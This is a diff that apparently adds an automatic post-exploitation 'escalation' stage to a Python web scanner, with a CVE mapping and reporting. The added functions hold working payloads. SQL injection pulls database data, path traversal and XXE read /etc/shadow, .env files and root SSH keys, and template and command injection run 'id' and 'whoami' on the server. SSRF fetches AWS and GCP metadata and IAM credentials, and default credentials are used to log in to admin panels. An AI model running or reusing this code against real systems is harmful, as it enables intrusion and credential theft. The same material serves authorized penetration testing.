@@ -656,6 +656,710 @@ CMDI_PAYLOADS = [
 
 
 # =====================================================================
+#  CVE MAPPING - Common CVEs por tipo de vulnerabilidad
+# =====================================================================
+CVE_MAP = {
+    "sqli": {
+        "error-based": ["CVE-2024-27956", "CVE-2023-36844", "CVE-2022-28346"],
+        "blind-boolean": ["CVE-2023-32315", "CVE-2022-28346"],
+        "time-based": ["CVE-2023-32315", "CVE-2024-27956"],
+        "post-error-based": ["CVE-2024-27956", "CVE-2022-28346"],
+        "generic": ["CVE-2024-27956", "CVE-2023-36844", "CVE-2023-32315", "CVE-2022-28346",
+                     "CVE-2021-42013", "CVE-2020-1472"],
+    },
+    "xss": {
+        "reflected": ["CVE-2024-21388", "CVE-2023-29489", "CVE-2022-29078"],
+        "dom-sink": ["CVE-2023-29489", "CVE-2022-29078"],
+        "partial": ["CVE-2023-29489"],
+        "post-reflected": ["CVE-2024-21388"],
+        "generic": ["CVE-2024-21388", "CVE-2023-29489", "CVE-2022-29078", "CVE-2021-41773"],
+    },
+    "lfi": {
+        "generic": ["CVE-2024-3400", "CVE-2023-34362", "CVE-2021-41773", "CVE-2021-42013",
+                     "CVE-2020-1938", "CVE-2019-19781"],
+    },
+    "rfi": {
+        "generic": ["CVE-2023-34362", "CVE-2021-42013", "CVE-2019-19781"],
+    },
+    "ssrf": {
+        "aws_metadata": ["CVE-2024-3400", "CVE-2023-46747", "CVE-2021-26855"],
+        "internal_access": ["CVE-2023-46747", "CVE-2021-26855"],
+        "generic": ["CVE-2024-3400", "CVE-2023-46747", "CVE-2021-26855", "CVE-2020-15504"],
+    },
+    "ssti": {
+        "jinja2": ["CVE-2024-34064", "CVE-2023-46136"],
+        "twig": ["CVE-2022-23614"],
+        "freemarker": ["CVE-2022-22963"],
+        "generic": ["CVE-2024-34064", "CVE-2023-46136", "CVE-2022-23614", "CVE-2022-22963"],
+    },
+    "cmdi": {
+        "generic": ["CVE-2024-3400", "CVE-2023-46747", "CVE-2022-22963", "CVE-2021-44228",
+                     "CVE-2021-42013", "CVE-2020-5902"],
+    },
+    "xxe": {
+        "file_read": ["CVE-2023-34362", "CVE-2021-26855", "CVE-2019-11581"],
+        "generic": ["CVE-2023-34362", "CVE-2021-26855", "CVE-2019-11581", "CVE-2018-1000136"],
+    },
+    "open_redirect": {
+        "generic": ["CVE-2024-21388", "CVE-2023-29489", "CVE-2022-40684"],
+    },
+    "crlf": {
+        "generic": ["CVE-2023-29489", "CVE-2021-41773"],
+    },
+    "host_header": {
+        "generic": ["CVE-2023-29489", "CVE-2022-40684"],
+    },
+    "subdomain_takeover": {
+        "generic": ["CVE-2023-0297"],
+    },
+    "jwt": {
+        "alg_none": ["CVE-2022-23529", "CVE-2022-21449"],
+        "weak_secret": ["CVE-2022-23529"],
+        "generic": ["CVE-2022-23529", "CVE-2022-21449", "CVE-2018-0114"],
+    },
+    "graphql": {
+        "introspection": ["CVE-2022-37315"],
+        "generic": ["CVE-2022-37315"],
+    },
+    "default_creds": {
+        "generic": ["CVE-2023-27524", "CVE-2022-1388", "CVE-2021-22986"],
+    },
+    "websocket": {
+        "no_origin_check": ["CVE-2023-32681"],
+        "generic": ["CVE-2023-32681"],
+    },
+    "hpp": {
+        "generic": ["CVE-2023-29489"],
+    },
+    "cloud_metadata": {
+        "aws": ["CVE-2024-3400", "CVE-2021-26855"],
+        "generic": ["CVE-2024-3400", "CVE-2021-26855"],
+    },
+}
+
+
+def get_cves(vuln_type, sub_type=None):
+    """Obtener CVEs relevantes para un tipo de vulnerabilidad."""
+    mapping = CVE_MAP.get(vuln_type, {})
+    if sub_type and sub_type in mapping:
+        return mapping[sub_type]
+    return mapping.get("generic", [])
+
+
+# =====================================================================
+#  AUTO-ESCALATION FUNCTIONS
+#  Cuando un probe inicial tiene exito, estas funciones profundizan
+#  automaticamente para extraer mas informacion.
+# =====================================================================
+
+def escalate_sqli(ctx, finding):
+    """SQLi confirmada -> extraer version DB, usuario, nombre DB, tablas."""
+    session = ctx["session"]
+    base = finding.get("_base_url", ctx["target_url"].split("?")[0])
+    param = finding["param"]
+    escalation = {"type": "sqli_escalation", "param": param, "extracted": {}}
+
+    log_info(f"  [ESCALATION] SQLi en {param} - extrayendo info de DB...")
+
+    # Payloads de extraccion por DB engine
+    extract_payloads = {
+        "db_version": [
+            ("MySQL", f"' UNION SELECT version()-- -"),
+            ("MSSQL", f"' UNION SELECT @@version-- -"),
+            ("PostgreSQL", f"' UNION SELECT version()-- -"),
+            ("Oracle", f"' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -"),
+            ("SQLite", f"' UNION SELECT sqlite_version()-- -"),
+        ],
+        "current_user": [
+            ("MySQL", f"' UNION SELECT user()-- -"),
+            ("MSSQL", f"' UNION SELECT SYSTEM_USER-- -"),
+            ("PostgreSQL", f"' UNION SELECT current_user-- -"),
+        ],
+        "current_db": [
+            ("MySQL", f"' UNION SELECT database()-- -"),
+            ("MSSQL", f"' UNION SELECT DB_NAME()-- -"),
+            ("PostgreSQL", f"' UNION SELECT current_database()-- -"),
+        ],
+        "table_names": [
+            ("MySQL", "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"),
+            ("MSSQL", "' UNION SELECT STRING_AGG(table_name,',') FROM information_schema.tables-- -"),
+            ("PostgreSQL", "' UNION SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public'-- -"),
+        ],
+    }
+
+    for info_type, payloads in extract_payloads.items():
+        for db_engine, payload in payloads:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            body = r.text
+            # Buscar en respuesta algo que no sea HTML normal (datos extraidos)
+            # Evitar falsos positivos verificando que la respuesta cambie
+            if len(body) > 0:
+                for error in SQLI_ERRORS:
+                    if error in body.lower():
+                        break
+                else:
+                    # Si no hay error SQL, la union podria haber funcionado
+                    # Buscar patrones de version
+                    version_patterns = [
+                        r'(\d+\.\d+\.\d+[-\w]*)',  # Version numbers
+                        r'(MariaDB[^\s<"]+)',
+                        r'(PostgreSQL[^\s<"]+)',
+                        r'(Microsoft SQL Server[^\n<"]+)',
+                        r'(SQLite \d+[^\s<"]+)',
+                    ]
+                    for pat in version_patterns:
+                        m = re.search(pat, body)
+                        if m and info_type == "db_version":
+                            val = m.group(1)
+                            escalation["extracted"]["db_version"] = val
+                            escalation["extracted"]["db_engine"] = db_engine
+                            log_vuln("CRITICAL", f"  [ESCALATION] DB Version: {val} ({db_engine})")
+                            break
+
+    # Time-based extraction si union no funciono
+    if "db_version" not in escalation["extracted"]:
+        # Fingerprint DB engine por respuesta a sleep
+        db_checks = [
+            ("MySQL", f"' AND SLEEP(3)-- -", 3),
+            ("MSSQL", f"'; WAITFOR DELAY '0:0:3'-- -", 3),
+            ("PostgreSQL", f"' AND pg_sleep(3)-- -", 3),
+        ]
+        for db_engine, payload, delay in db_checks:
+            start = time.time()
+            safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=10)
+            elapsed = time.time() - start
+            if elapsed >= delay * 0.8:
+                escalation["extracted"]["db_engine"] = db_engine
+                log_vuln("HIGH", f"  [ESCALATION] DB Engine (time-based): {db_engine}")
+                break
+
+    # Agregar CVEs
+    sub = finding.get("type", "generic")
+    escalation["cves"] = get_cves("sqli", sub)
+    if escalation["extracted"]:
+        escalation["severity"] = "CRITICAL"
+    else:
+        escalation["severity"] = "HIGH"
+
+    return escalation
+
+
+def escalate_lfi(ctx, finding):
+    """LFI confirmada -> intentar leer archivos sensibles."""
+    session = ctx["session"]
+    base = ctx["target_url"].split("?")[0]
+    param = finding["param"]
+    payload_base = finding["payload"]
+    escalation = {"type": "lfi_escalation", "param": param, "files_read": []}
+
+    log_info(f"  [ESCALATION] LFI en {param} - intentando leer archivos sensibles...")
+
+    # Determinar profundidad de traversal que funciono
+    depth = payload_base.count("../")
+    prefix = "../" * depth if depth else "../../../../"
+
+    sensitive_files = [
+        (f"{prefix}etc/shadow", ["root:", "daemon:"], "CRITICAL"),
+        (f"{prefix}etc/hosts", ["localhost", "127.0.0.1"], "HIGH"),
+        (f"{prefix}proc/self/environ", ["PATH=", "HOME=", "USER="], "CRITICAL"),
+        (f"{prefix}proc/self/cmdline", ["python", "php", "node", "java", "apache"], "HIGH"),
+        (f"{prefix}var/log/auth.log", ["session opened", "sshd", "pam_unix"], "HIGH"),
+        (f"{prefix}var/log/apache2/access.log", ["GET /", "POST /", "HTTP/"], "MEDIUM"),
+        (f"{prefix}etc/nginx/nginx.conf", ["server", "location", "proxy_pass"], "HIGH"),
+        (f"{prefix}etc/apache2/apache2.conf", ["ServerRoot", "DocumentRoot"], "HIGH"),
+        (f"{prefix}app/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"], "CRITICAL"),
+        (f"{prefix}var/www/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"], "CRITICAL"),
+        (f"{prefix}home/www/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"], "CRITICAL"),
+        (f"{prefix}etc/mysql/my.cnf", ["mysqld", "datadir", "socket"], "HIGH"),
+        (f"{prefix}root/.bash_history", ["ssh", "mysql", "sudo"], "CRITICAL"),
+        (f"{prefix}root/.ssh/id_rsa", ["PRIVATE KEY", "RSA"], "CRITICAL"),
+        # PHP wrappers
+        ("php://filter/convert.base64-encode/resource=index.php", ["PD9w"], "HIGH"),
+        ("php://filter/convert.base64-encode/resource=config.php", ["PD9w"], "HIGH"),
+        ("php://filter/convert.base64-encode/resource=wp-config.php", ["PD9w"], "HIGH"),
+        ("php://filter/convert.base64-encode/resource=.env", ["PD9w", "REFV"], "CRITICAL"),
+    ]
+
+    for file_payload, indicators, sev in sensitive_files:
+        r = safe_request(session, "GET", f"{base}?{param}={quote(file_payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text
+        for ind in indicators:
+            if ind in body:
+                filename = file_payload.split("/")[-1] if "/" in file_payload else file_payload[:40]
+                log_vuln(sev, f"  [ESCALATION] Archivo leido: {filename}")
+                escalation["files_read"].append({
+                    "file": file_payload, "indicator": ind, "severity": sev,
+                    "content_preview": body[:200] if sev == "CRITICAL" else ""
+                })
+                break
+
+    escalation["cves"] = get_cves("lfi")
+    escalation["severity"] = "CRITICAL" if any(f["severity"] == "CRITICAL" for f in escalation["files_read"]) else "HIGH"
+    return escalation
+
+
+def escalate_ssti(ctx, finding):
+    """SSTI confirmada -> identificar engine + probar RCE."""
+    session = ctx["session"]
+    base = ctx["target_url"].split("?")[0]
+    param = finding["param"]
+    escalation = {"type": "ssti_escalation", "param": param, "engine": None, "rce_possible": False}
+
+    log_info(f"  [ESCALATION] SSTI en {param} - identificando template engine...")
+
+    # Engine identification payloads
+    engine_checks = [
+        ("Jinja2", "{{config.items()}}", ["SECRET_KEY", "DEBUG"]),
+        ("Jinja2", "{{self.__class__.__mro__}}", ["__class__", "object"]),
+        ("Twig", "{{_self.env.getExtension('core')}}", ["Twig"]),
+        ("Freemarker", "${.version}", ["2.", "Freemarker"]),
+        ("Freemarker", "<#assign x='freemarker'>${x}", ["freemarker"]),
+        ("ERB", "<%= self.class %>", ["ERB", "String"]),
+        ("Mako", "${self.module.__loader__}", ["module", "loader"]),
+        ("Pebble", "{% set x = 'pebble' %}{{x}}", ["pebble"]),
+        ("Velocity", "#set($x='velocity')$x", ["velocity"]),
+    ]
+
+    for engine, payload, indicators in engine_checks:
+        r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text
+        for ind in indicators:
+            if ind.lower() in body.lower():
+                escalation["engine"] = engine
+                log_vuln("CRITICAL", f"  [ESCALATION] Template engine: {engine}")
+                break
+        if escalation["engine"]:
+            break
+
+    # RCE detection (sin ejecutar realmente, solo verificando que la sintaxis es evaluada)
+    rce_checks = []
+    if escalation["engine"] == "Jinja2":
+        rce_checks = [
+            ("{{lipsum.__globals__['os'].popen('id').read()}}", ["uid=", "gid="]),
+            ("{{cycler.__init__.__globals__.os.popen('whoami').read()}}", ["root", "www", "apache", "nginx"]),
+        ]
+    elif escalation["engine"] == "Freemarker":
+        rce_checks = [
+            ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', ["uid=", "gid="]),
+        ]
+    elif escalation["engine"] == "Twig":
+        rce_checks = [
+            ("{{['id']|filter('system')}}", ["uid=", "gid="]),
+        ]
+
+    for payload, indicators in rce_checks:
+        r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text
+        for ind in indicators:
+            if ind in body:
+                escalation["rce_possible"] = True
+                escalation["rce_output"] = body[:200]
+                log_vuln("CRITICAL", f"  [ESCALATION] RCE confirmado via {escalation['engine']}!")
+                break
+        if escalation["rce_possible"]:
+            break
+
+    sub = escalation["engine"].lower() if escalation["engine"] else "generic"
+    escalation["cves"] = get_cves("ssti", sub)
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_cmdi(ctx, finding):
+    """CMDi confirmada -> extraer info del sistema."""
+    session = ctx["session"]
+    base = ctx["target_url"].split("?")[0]
+    param = finding["param"]
+    escalation = {"type": "cmdi_escalation", "param": param, "system_info": {}}
+
+    log_info(f"  [ESCALATION] CMDi en {param} - extrayendo info del sistema...")
+
+    # Si fue time-based, intentar output-based con comandos de info
+    info_cmds = [
+        ("whoami", ";whoami", ["root", "www", "apache", "nginx", "nobody", "admin"]),
+        ("hostname", ";hostname", None),  # Cualquier output es valido
+        ("uname", ";uname -a", ["Linux", "Darwin", "Windows"]),
+        ("id", ";id", ["uid=", "gid="]),
+        ("pwd", ";pwd", ["/var/www", "/home", "/opt", "/usr"]),
+        ("ifconfig", ";ifconfig 2>/dev/null || ip addr", ["inet ", "eth0", "ens"]),
+    ]
+
+    for info_name, cmd_payload, indicators in info_cmds:
+        r = safe_request(session, "GET", f"{base}?{param}=127.0.0.1{quote(cmd_payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text
+        if indicators:
+            for ind in indicators:
+                if ind in body:
+                    escalation["system_info"][info_name] = body[:150].strip()
+                    log_vuln("CRITICAL", f"  [ESCALATION] {info_name}: {ind}")
+                    break
+        else:
+            # Para hostname, cualquier respuesta no-HTML corta podria ser valida
+            clean = re.sub(r'<[^>]+>', '', body).strip()
+            if clean and len(clean) < 100:
+                escalation["system_info"][info_name] = clean[:80]
+
+    escalation["cves"] = get_cves("cmdi")
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_ssrf(ctx, finding):
+    """SSRF confirmada -> enumerar metadata cloud en profundidad."""
+    session = ctx["session"]
+    base = ctx["target_url"].split("?")[0]
+    param = finding["param"]
+    escalation = {"type": "ssrf_escalation", "param": param, "cloud_data": {}}
+
+    log_info(f"  [ESCALATION] SSRF en {param} - enumerando metadata...")
+
+    # AWS metadata deep enumeration
+    aws_paths = [
+        ("instance_id", "http://169.254.169.254/latest/meta-data/instance-id"),
+        ("instance_type", "http://169.254.169.254/latest/meta-data/instance-type"),
+        ("ami_id", "http://169.254.169.254/latest/meta-data/ami-id"),
+        ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
+        ("local_ipv4", "http://169.254.169.254/latest/meta-data/local-ipv4"),
+        ("public_ipv4", "http://169.254.169.254/latest/meta-data/public-ipv4"),
+        ("security_groups", "http://169.254.169.254/latest/meta-data/security-groups"),
+        ("iam_role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+        ("user_data", "http://169.254.169.254/latest/user-data"),
+    ]
+
+    # GCP metadata
+    gcp_paths = [
+        ("project_id", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
+        ("zone", "http://metadata.google.internal/computeMetadata/v1/instance/zone"),
+        ("hostname", "http://metadata.google.internal/computeMetadata/v1/instance/hostname"),
+        ("service_accounts", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"),
+    ]
+
+    indicator = finding.get("indicator", "")
+    if "ami-id" in indicator or "instance" in indicator:
+        paths = aws_paths
+        cloud = "AWS"
+    elif "compute" in indicator or "project" in indicator:
+        paths = gcp_paths
+        cloud = "GCP"
+    else:
+        paths = aws_paths + gcp_paths
+        cloud = "Unknown"
+
+    for info_name, meta_url in paths:
+        r = safe_request(session, "GET", f"{base}?{param}={quote(meta_url)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r or r.status_code != 200:
+            continue
+        body = r.text.strip()
+        if body and len(body) < 500 and "<html" not in body.lower():
+            escalation["cloud_data"][info_name] = body[:200]
+            log_vuln("CRITICAL", f"  [ESCALATION] {cloud} {info_name}: {body[:80]}")
+
+    # Si encontramos IAM role, intentar obtener credenciales
+    iam_role = escalation["cloud_data"].get("iam_role", "")
+    if iam_role and "\n" not in iam_role and len(iam_role) < 100:
+        cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{iam_role.strip()}"
+        r = safe_request(session, "GET", f"{base}?{param}={quote(cred_url)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and "AccessKeyId" in r.text:
+            escalation["cloud_data"]["iam_credentials"] = "FOUND (AccessKeyId present)"
+            log_vuln("CRITICAL", f"  [ESCALATION] IAM CREDENTIALS EXPOSED!")
+
+    escalation["cves"] = get_cves("ssrf", "aws_metadata" if cloud == "AWS" else "generic")
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_xxe(ctx, finding):
+    """XXE confirmada -> intentar leer mas archivos."""
+    session = ctx["session"]
+    endpoint = finding["endpoint"]
+    escalation = {"type": "xxe_escalation", "endpoint": endpoint, "files_read": []}
+
+    log_info(f"  [ESCALATION] XXE en {endpoint} - intentando leer archivos...")
+
+    sensitive_files = [
+        ("/etc/shadow", ["root:", "daemon:"]),
+        ("/etc/hosts", ["localhost", "127.0.0.1"]),
+        ("/etc/hostname", None),
+        ("/proc/self/environ", ["PATH=", "HOME="]),
+        ("/var/www/html/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+        ("/app/.env", ["DB_PASSWORD", "APP_KEY"]),
+    ]
+
+    for filepath, indicators in sensitive_files:
+        xxe = (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file://{filepath}">]>'
+               f'<test>&xxe;</test>')
+        for ct in ["application/xml", "text/xml"]:
+            r = safe_request(session, "POST", endpoint, ctx["rate_limiter"],
+                           ctx["mode_config"]["rotate_ua"],
+                           data=xxe, headers={"Content-Type": ct})
+            if not r:
+                continue
+            body = r.text
+            found = False
+            if indicators:
+                for ind in indicators:
+                    if ind in body:
+                        found = True
+                        break
+            else:
+                clean = re.sub(r'<[^>]+>', '', body).strip()
+                if clean and len(clean) < 200:
+                    found = True
+
+            if found:
+                log_vuln("CRITICAL", f"  [ESCALATION] XXE leyo: {filepath}")
+                escalation["files_read"].append({"file": filepath, "severity": "CRITICAL"})
+                break
+
+    escalation["cves"] = get_cves("xxe", "file_read")
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_xss(ctx, finding):
+    """XSS confirmado -> analizar contexto, probar bypasses."""
+    session = ctx["session"]
+    base = ctx["target_url"].split("?")[0]
+    param = finding["param"]
+    escalation = {"type": "xss_escalation", "param": param, "context": None, "bypasses": []}
+
+    log_info(f"  [ESCALATION] XSS en {param} - analizando contexto...")
+
+    # Determinar contexto de inyeccion
+    canary = f"XSS_CANARY_{random.randint(10000,99999)}"
+    r = safe_request(session, "GET", f"{base}?{param}={canary}",
+                    ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+    if not r:
+        escalation["cves"] = get_cves("xss", finding.get("type", "generic"))
+        return escalation
+
+    body = r.text
+    idx = body.find(canary)
+    if idx == -1:
+        escalation["cves"] = get_cves("xss", finding.get("type", "generic"))
+        return escalation
+
+    # Analizar contexto
+    before = body[max(0, idx-50):idx]
+    after = body[idx+len(canary):idx+len(canary)+50]
+
+    if 'value="' in before or "value='" in before:
+        escalation["context"] = "attribute_value"
+        log_info(f"  [ESCALATION] Contexto: dentro de atributo HTML")
+    elif "<script" in before.lower() and "</script" not in before.lower():
+        escalation["context"] = "javascript"
+        log_info(f"  [ESCALATION] Contexto: dentro de bloque JavaScript")
+    elif "<!--" in before and "-->" not in before:
+        escalation["context"] = "html_comment"
+        log_info(f"  [ESCALATION] Contexto: dentro de comentario HTML")
+    else:
+        escalation["context"] = "html_body"
+        log_info(f"  [ESCALATION] Contexto: body HTML directo")
+
+    # Probar bypasses segun contexto
+    bypass_payloads = [
+        ("<svg/onload=alert(1)>", "SVG onload"),
+        ("<img src=x onerror=alert(1)>", "IMG onerror"),
+        ("<details open ontoggle=alert(1)>", "details ontoggle"),
+        ("'-alert(1)-'", "JS string break"),
+        ("</script><script>alert(1)</script>", "script break"),
+        ("<iframe src=javascript:alert(1)>", "iframe JS"),
+    ]
+
+    for payload, desc in bypass_payloads:
+        r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and payload in r.text:
+            escalation["bypasses"].append({"payload": payload, "desc": desc})
+            log_vuln("HIGH", f"  [ESCALATION] Bypass funciona: {desc}")
+
+    escalation["cves"] = get_cves("xss", finding.get("type", "generic"))
+    escalation["severity"] = "HIGH" if not escalation["bypasses"] else "CRITICAL"
+    return escalation
+
+
+def escalate_jwt(ctx, finding):
+    """JWT vulnerable -> intentar explotar alg:none o secreto debil."""
+    escalation = {"type": "jwt_escalation", "exploits": []}
+    issue = finding.get("issue", "")
+
+    log_info(f"  [ESCALATION] JWT ({issue}) - intentando explotacion...")
+
+    if "alg=none" in issue:
+        escalation["exploits"].append({
+            "technique": "alg:none",
+            "description": "El servidor acepta tokens sin firma. Un atacante puede forjar tokens arbitrarios.",
+            "impact": "Autenticacion bypass completo",
+            "severity": "CRITICAL",
+        })
+        log_vuln("CRITICAL", "  [ESCALATION] JWT alg:none -> bypass de autenticacion posible")
+
+    if "weak_secret" in issue:
+        secret = issue.split(": ")[-1] if ": " in issue else "unknown"
+        escalation["exploits"].append({
+            "technique": "weak_secret",
+            "secret": secret,
+            "description": f"JWT firmado con secreto debil: {secret}. Permite forjar tokens.",
+            "impact": "Forge de tokens, escalacion de privilegios",
+            "severity": "CRITICAL",
+        })
+        log_vuln("CRITICAL", f"  [ESCALATION] JWT secreto debil '{secret}' -> forge de tokens posible")
+
+    escalation["cves"] = get_cves("jwt", "alg_none" if "alg=none" in issue else "weak_secret")
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_default_creds(ctx, finding):
+    """Credenciales default confirmadas -> enumerar panel admin."""
+    session = ctx["session"]
+    base = ctx["base_url"]
+    path = finding["path"]
+    user = finding["username"]
+    pwd = finding["password"]
+    escalation = {"type": "defcreds_escalation", "path": path, "admin_features": []}
+
+    log_info(f"  [ESCALATION] Creds default en /{path} - enumerando panel...")
+
+    # Autenticarse
+    r = safe_request(session, "POST", f"{base}/{path}",
+                    ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                    data={"username": user, "password": pwd, "login": "Login",
+                          "user": user, "pass": pwd, "log": user, "pwd": pwd},
+                    allow_redirects=True)
+    if not r:
+        escalation["cves"] = get_cves("default_creds")
+        return escalation
+
+    # Buscar funcionalidades admin
+    admin_paths = [
+        ("file_upload", ["upload", "media", "files", "attachment"]),
+        ("user_management", ["users", "accounts", "members"]),
+        ("settings", ["settings", "config", "options", "preferences"]),
+        ("database", ["phpmyadmin", "adminer", "database", "sql"]),
+        ("shell", ["terminal", "console", "exec", "command"]),
+        ("plugins", ["plugins", "modules", "extensions", "addons"]),
+        ("themes", ["themes", "templates", "appearance"]),
+        ("logs", ["logs", "audit", "activity"]),
+    ]
+
+    body = r.text.lower()
+    for feature, keywords in admin_paths:
+        for kw in keywords:
+            if kw in body:
+                escalation["admin_features"].append(feature)
+                log_vuln("HIGH", f"  [ESCALATION] Admin feature: {feature}")
+                break
+
+    escalation["cves"] = get_cves("default_creds")
+    escalation["severity"] = "CRITICAL"
+    return escalation
+
+
+def escalate_open_redirect(ctx, finding):
+    """Open redirect confirmado -> verificar si puede usarse para phishing o token theft."""
+    escalation = {
+        "type": "redirect_escalation",
+        "param": finding["param"],
+        "redirect_to": finding.get("redirect", ""),
+        "attack_chains": [],
+    }
+
+    log_info(f"  [ESCALATION] Open Redirect en {finding['param']} - evaluando impacto...")
+
+    redirect = finding.get("redirect", "")
+    if redirect.startswith("//") or redirect.startswith("http"):
+        escalation["attack_chains"].append({
+            "chain": "OAuth token theft",
+            "desc": "Redirect puede usarse para robar tokens OAuth/OIDC en flujo de autorizacion",
+            "severity": "HIGH",
+        })
+        escalation["attack_chains"].append({
+            "chain": "Phishing",
+            "desc": "Redirect desde dominio confiable puede usarse para phishing credible",
+            "severity": "MEDIUM",
+        })
+        log_vuln("HIGH", "  [ESCALATION] Open Redirect -> OAuth token theft posible")
+
+    if redirect.startswith("javascript:"):
+        escalation["attack_chains"].append({
+            "chain": "XSS via redirect",
+            "desc": "javascript: URI en redirect permite ejecucion de JS (equivalente a XSS)",
+            "severity": "HIGH",
+        })
+        log_vuln("HIGH", "  [ESCALATION] Open Redirect -> javascript: XSS")
+
+    escalation["cves"] = get_cves("open_redirect")
+    escalation["severity"] = "HIGH" if escalation["attack_chains"] else "MEDIUM"
+    return escalation
+
+
+def run_escalation(ctx, module_name, findings):
+    """Ejecutar escalacion automatica para findings confirmados."""
+    if not findings:
+        return []
+
+    escalation_map = {
+        "sqli": escalate_sqli,
+        "xss": escalate_xss,
+        "lfi": escalate_lfi,
+        "ssti": escalate_ssti,
+        "cmdi": escalate_cmdi,
+        "ssrf": escalate_ssrf,
+        "xxe": escalate_xxe,
+        "jwt": escalate_jwt,
+        "default_creds": escalate_default_creds,
+        "open_redirect": escalate_open_redirect,
+    }
+
+    escalate_fn = escalation_map.get(module_name)
+    if not escalate_fn:
+        # Para modulos sin escalacion especifica, solo agregar CVEs
+        for f in findings:
+            f["cves"] = get_cves(module_name, f.get("type", "generic"))
+        return []
+
+    escalations = []
+    # Escalar solo los findings de severidad HIGH o CRITICAL (los confirmados)
+    critical_findings = [f for f in findings if f.get("severity") in ("CRITICAL", "HIGH")]
+
+    # Limitar escalacion a max 3 findings por modulo para no ser demasiado agresivo
+    for finding in critical_findings[:3]:
+        try:
+            section_header(f"AUTO-ESCALATION: {module_name.upper()}")
+            result = escalate_fn(ctx, finding)
+            if result:
+                escalations.append(result)
+        except Exception as e:
+            log_fail(f"Error en escalacion {module_name}: {e}")
+
+    # Agregar CVEs a findings originales tambien
+    for f in findings:
+        if "cves" not in f:
+            f["cves"] = get_cves(module_name, f.get("type", "generic"))
+
+    return escalations
+
+
+# =====================================================================
 #  HTML LINK PARSER
 # =====================================================================
 class LinkParser(HTMLParser):
@@ -2986,12 +3690,38 @@ def generate_report(ctx):
 
         for finding in sorted(all_findings, key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(x.get("severity","INFO"))):
             f.write(f"[{finding['severity']}] [{finding['module']}] ")
-            f.write(f"{json.dumps({k:v for k,v in finding.items() if k not in ('severity','module')})}\n")
+            # Incluir CVEs si existen
+            cves = finding.get("cves", [])
+            if cves:
+                f.write(f"CVE: {', '.join(cves[:3])} | ")
+            f.write(f"{json.dumps({k:v for k,v in finding.items() if k not in ('severity','module','cves')})}\n")
 
         f.write(f"\n{'='*70}\n")
         f.write("RESULTADOS DETALLADOS:\n\n")
 
+        # Escalation results section
+        escalation_results = {k: v for k, v in ctx["results"].items() if k.endswith("_escalation")}
+        if escalation_results:
+            f.write(f"\n{'='*70}\n")
+            f.write("AUTO-ESCALATION RESULTS:\n\n")
+            for esc_name, esc_data in escalation_results.items():
+                f.write(f"\n--- {esc_name.upper()} ---\n")
+                if isinstance(esc_data, list):
+                    for item in esc_data:
+                        if isinstance(item, dict):
+                            cves = item.get("cves", [])
+                            if cves:
+                                f.write(f"  CVEs: {', '.join(cves)}\n")
+                            f.write(json.dumps(item, indent=2, default=str) + "\n")
+                else:
+                    f.write(json.dumps(esc_data, indent=2, default=str) + "\n")
+
+        f.write(f"\n{'='*70}\n")
+        f.write("RESULTADOS DETALLADOS POR MODULO:\n\n")
+
         for module, data in ctx["results"].items():
+            if module.endswith("_escalation"):
+                continue  # Ya se mostraron arriba
             f.write(f"\n--- {module.upper()} ---\n")
             f.write(json.dumps(data, indent=2, default=str) + "\n")
 
@@ -3033,6 +3763,42 @@ def generate_report(ctx):
         low = severity_count["LOW"]
         print(f"    {_c(C.B, f'LOW: {low}')} ")
     print(f"    Total hallazgos: {total}")
+
+    # Mostrar resumen de escalaciones
+    escalation_results = {k: v for k, v in ctx["results"].items() if k.endswith("_escalation")}
+    if escalation_results:
+        print(f"\n  {_c(C.BOLD, 'AUTO-ESCALATION:')}")
+        for esc_name, esc_data in escalation_results.items():
+            mod_name = esc_name.replace("_escalation", "").upper()
+            if isinstance(esc_data, list):
+                for item in esc_data:
+                    if isinstance(item, dict):
+                        cves = item.get("cves", [])
+                        cve_str = f" | CVE: {', '.join(cves[:2])}" if cves else ""
+                        etype = item.get("type", "unknown")
+                        sev = item.get("severity", "INFO")
+                        extracted = ""
+                        if "extracted" in item and item["extracted"]:
+                            extracted = f" -> {json.dumps(item['extracted'], default=str)[:80]}"
+                        elif "files_read" in item and item["files_read"]:
